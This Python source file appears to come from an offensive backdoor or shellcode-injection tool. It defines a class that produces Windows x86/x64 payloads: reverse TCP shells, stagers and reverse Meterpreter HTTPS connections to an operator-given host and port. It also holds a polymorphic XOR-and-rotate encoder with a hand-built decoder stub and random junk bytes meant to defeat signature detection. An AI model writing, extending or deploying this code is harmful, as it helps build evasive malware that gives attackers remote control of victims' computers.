#!/usr/bin/env python

"""
    Provides shellcode building.
"""

# Import shellcode builders
from thirdparty.WinIntelPE64 import winI64_shellcode
from thirdparty.WinIntelPE32 import winI32_shellcode
import random
import struct
import os
from gc import garbage

class ShellCodeBuilder(object):

    def __init__(self, ):
        self.__host = None
        self.__port = None
        self.__shellcode = None
        self.__shellcodes = ["reverse_shell_tcp",
                             "reverse_tcp_stager_threaded",
                             "reverse_meterpreter_https_threaded",
                             "user_supplied_shellcode",
                             "user_supplied_shellcode_threaded",
                             "demo_nop",
                             "demo_calc"]
        self.__selected_shellcode = None
        self.__error = ""

    def set_params(self, host, port, shellcode=None):
        self.__host = host
        self.__port = port
        self.__shellcode = shellcode

    @staticmethod
    def __rol(byte, count):
        return bytes([(byte << count | byte >> (8 - count)) & 0xff])

    @staticmethod
    def __enc_shellcode(shellcode, cnt, xor):
        decoder = b""
        for byte in shellcode:
            decoder += ShellCodeBuilder.__rol(byte ^ xor, cnt)

        return decoder

    @staticmethod
    def __generate_garbage():
        rnd = random.randint(1, 4)
        # Break alignment
        if rnd in (1, 2):
          return b"\xeb\xff\xc0\x48"
        
          # Random Garbage    
        elif rnd is 3:
          rnd = random.randint(1, 6)
          return b"\xeb" + struct.pack("<B", rnd) + os.urandom(rnd)  
          
          # Insert NOPs
        else:
          return b"\x90" * random.randint(1, 2)
          
        
    @staticmethod
    def __build_decoder_stub(length, rnd, rnd2):
        """
        x86/x64 produces the same code
      
        ASM:
        
        _start:               
          jmp short encoded    ; Load Address
        getaddr:
          pop ebx              ; stores data
          mov ecx, xxxxxxxx    ; shellcode size
        decode:
          ror byte ptr [ecx + ebx - 1], rnd  ; Random Bit Rotate
          xor byte ptr [ecx + ebx - 1], rnd2 ; Random XOr    
          loop short decode
          
          jmp ebx ; jmp to shellcode
        encoded:
          call getaddr
        ; Shellcode
        end _start
        """
      
        # Add some garbage
        garbage1 = ShellCodeBuilder.__generate_garbage()
        garbage2 = ShellCodeBuilder.__generate_garbage()
        garbage3 = ShellCodeBuilder.__generate_garbage()
      
        decoder = ShellCodeBuilder.__generate_garbage()
        decoder += b"\x90\xeb"
        decoder += struct.pack("<B", 0x14 + len(garbage1) + len(garbage2) + len(garbage3))
        decoder += garbage1
        decoder += b"\x5b\xb9"
        decoder += struct.pack("<I", length)
        decoder += garbage2
        decoder += b"\xc0\x4c\x0b\xff"
        decoder += struct.pack("<B", rnd)
        decoder += garbage3
        decoder += b"\x80\x74\x19\xff"
        decoder += struct.pack("<B", rnd2)
        decoder += b"\xe2"
        decoder += struct.pack("<B", 0xf4 - (len(garbage2) + len(garbage3)))
        decoder += b"\xff\xe3\xe8"
        decoder += struct.pack("<B", 0xe7 - (len(garbage1) + len(garbage2) + len(garbage3)))
        decoder += b"\xff\xff\xff"
        return decoder
      
    @staticmethod
    def __encode(shellcode, iterations=3):
        # Initialize Random Vars
        random.seed()
        for i in range(1, iterations):
          rnd1 = random.randint(1, 7)
          rnd2 = random.randint(1, 255)
        
          # decoder 1
          decoder = ShellCodeBuilder.__build_decoder_stub(len(shellcode), rnd1, rnd2)
          # payload
          shellcode = ShellCodeBuilder.__enc_shellcode(shellcode, rnd1, rnd2)
          shellcode =  decoder + shellcode  
          
        return shellcode

    def __check_params(self):
        if self.__selected_shellcode is None:
            self.__error = "No shellcode selected"
            return False
        if (self.__selected_shellcode.find("user") is not -1) and (self.__shellcode is None):
            self.__error = "You have to provide a shellcode for this payload"
            return False
        elif (self.__selected_shellcode.find("demo") is not -1):
            self.__error = ""
            return True    
        elif (self.__port is None) or (self.__host is None):
            self.__error = "You have to provide host and port for this payload"
            return False
        return True

    def __return_shellcode(self, builder):
        if self.__selected_shellcode == "reverse_shell_tcp":
            return builder.reverse_shell_tcp()
        elif self.__selected_shellcode == "reverse_tcp_stager_threaded":
            return builder.reverse_tcp_stager_threaded()
        elif self.__selected_shellcode == "reverse_meterpreter_https_threaded":
            return builder.meterpreter_reverse_https_threaded()
        elif self.__selected_shellcode == "user_supplied_shellcode":
            return builder.user_supplied_shellcode()
        elif self.__selected_shellcode == "user_supplied_shellcode_threaded":
            return builder.user_supplied_shellcode_threaded()
        elif self.__selected_shellcode == "demo_nop":
            return builder.demo_nop()
        elif self.__selected_shellcode == "demo_calc":
            return builder.demo_calc()
        return None

    def list_shellcodes(self):
        return self.__shellcodes

    def select_shellcode(self, shellcode):
        if shellcode not in self.__shellcodes:
            self.__error = "unknown shellcode"
            return False

        self.__selected_shellcode = shellcode
        return True

    def get_shellcode_x86(self, encode=False):
        if not self.__check_params():
            return None
        builder = winI32_shellcode(self.__host, self.__port, self.__shellcode)
        return ShellCodeBuilder.__encode(self.__return_shellcode(builder)) if encode else self.__return_shellcode(builder)

    def get_shellcode_x64(self, encode=False):
        if not self.__check_params():
            return None
        builder = winI64_shellcode(self.__host, self.__port, self.__shellcode)
        if encode:
            return ShellCodeBuilder.__encode(self.__return_shellcode(builder))
        else:
            return self.__return_shellcode(builder)

    def get_last_error(self):
        return self.__error
